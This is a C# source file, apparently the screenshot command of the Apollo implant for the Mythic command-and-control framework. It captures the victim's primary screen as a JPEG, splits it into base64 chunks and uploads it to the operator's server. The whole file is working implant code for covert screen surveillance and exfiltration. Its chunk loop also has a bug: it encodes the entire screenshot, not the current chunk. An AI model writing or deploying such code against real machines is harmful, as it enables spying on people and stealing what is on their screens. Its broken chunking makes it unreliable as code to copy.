#define COMMAND_NAME_UPPER

#if DEBUG
#undef SCREENSHOT
#define SCREENSHOT
#endif

#if SCREENSHOT
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Mythic.Structs;
using Apollo.Tasks;
using Apollo.Jobs;
using Apollo.MessageInbox;

/// <summary>
/// This task will capture a screenshot and upload it to the Apfell server
/// </summary>
namespace Apollo.CommandModules
{
    public class Screenshot
    {
        /// <summary>
        /// Capture the screen associated with the current
        /// desktop session.
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="implant">Agent associated with this task.</param>
        public static void Execute(Job job, Agent implant)
        {
            Task task = job.Task;
            byte[] screenshot = TakeScreenShot();
            if (screenshot != null)
            {
                SendCapture(implant, job, screenshot);
                job.SetComplete();
            } else
            {
                job.SetError("Failed to take screenshot of the screen.");
            }
            
        }


        public static byte[] TakeScreenShot()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            //Bitmap bmp = new Bitmap(1920, 1080);
            Bitmap res = null;
            //Size pt = new Size(1920, 1080);
            byte[] screenshot = null;
            using (Graphics g = Graphics.FromImage(bmp))
            {
                try
                {
                    g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        screenshot = ms.ToArray();
                    }
                }
                catch { }
            }
            return screenshot;
        }

        /// <summary>
        /// Send a chunked screenshot response to the Apfell server.
        /// </summary>
        /// <param name="implant">Agent that will be sending the data.</param>
        /// <param name="task">Task associated with the screenshot.</param>
        /// <param name="screenshot">Byte array of data that holds a chunked screenshot response.</param>
        private static void SendCapture(Agent implant, Job job, byte[] screenshot)
        {
            Task task = job.Task;
            try // Try block for HTTP request
            {
                // Send total number of chunks to Apfell server
                // Number of chunks will always be one for screen capture task
                // Receive file ID in response
                // Send number of chunks associated with task to Apfell server
                // Response will have the file ID to send file with

                int totalChunks = (int)Math.Ceiling((double)screenshot.Length / (double)implant.Profile.ChunkSize);
                ApolloTaskResponse registrationMessage = new ApolloTaskResponse()
                {
                    task_id = task.id,
                    total_chunks = totalChunks,
                    full_path = task.id
                };
                //SCTaskResp initial = new SCTaskResp(task.id, "{\"total_chunks\": " + total_chunks + ", \"task\": \"" + task.id + "\"}");
                job.AddOutput(registrationMessage);
                MythicTaskResponse resp = (MythicTaskResponse)Inbox.GetMessage(task.id);
                if (resp.file_id == "")
                {
                    job.SetError(String.Format("Did not parse a file_id from the server response. Server reply was: {0}", resp.ToString()));
                    return;
                }
                // Convert chunk to base64 blob and create our FileChunk
                for (int i = 0; i < totalChunks; i++)
                {
                    ApolloTaskResponse fc = new ApolloTaskResponse();
                    fc.chunk_num = i+1;
                    fc.file_id = resp.file_id;
                    fc.total_chunks = -1;
                    byte[] screenshotChunk = new byte[implant.Profile.ChunkSize];
                    if (implant.Profile.ChunkSize > screenshot.Length - (i * implant.Profile.ChunkSize))
                        Array.Copy(screenshot, i * implant.Profile.ChunkSize, screenshotChunk, 0, screenshot.Length - (i * implant.Profile.ChunkSize));
                    else
                        Array.Copy(screenshot, i * implant.Profile.ChunkSize, screenshotChunk, 0, implant.Profile.ChunkSize);
                    fc.chunk_data = Convert.ToBase64String(screenshot);
                    fc.task_id = task.id;

                    job.AddOutput(fc);
                    Inbox.GetMessage(task.id);
                    //Debug.WriteLine($"[-] SendCapture - RESPONSE: {implant.Profile.SendResponse(response)}");
                }
            }
            catch (Exception e) // Catch exceptions from HTTP requests
            {
                // Something failed, so we need to tell the server about it
                job.SetError($"Error: {e.Message}\n\n{e.StackTrace}");
            }
        }
    }
}
#endif